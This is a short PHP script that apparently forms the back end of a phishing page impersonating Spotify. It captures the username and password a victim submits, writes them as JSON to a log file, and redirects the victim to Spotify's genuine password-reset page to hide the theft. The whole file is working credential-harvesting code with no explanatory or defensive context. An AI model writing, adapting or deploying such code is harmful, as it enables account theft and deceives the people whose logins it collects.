<?php

header('Location: https://www.spotify.com/us/password-reset/');
$data = array('site' => 'Spotify',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>